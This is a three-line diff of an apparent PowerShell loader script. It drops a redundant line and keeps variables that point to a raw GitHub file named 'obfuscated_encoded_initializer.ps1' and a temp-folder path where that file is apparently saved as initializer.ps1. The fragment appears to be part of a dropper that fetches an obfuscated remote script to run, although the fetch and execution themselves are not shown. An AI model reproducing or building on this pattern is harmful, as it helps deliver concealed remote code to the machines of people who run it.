@@ -1,4 +1,3 @@
-$currLoc = (Get-Location).Path
 $currLoc = "$PSScriptRoot\user.ps1"
 $init_uri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/obfuscated_encoded_initializer.ps1"
 $scriptPath = "$env:temp\initializer.ps1"
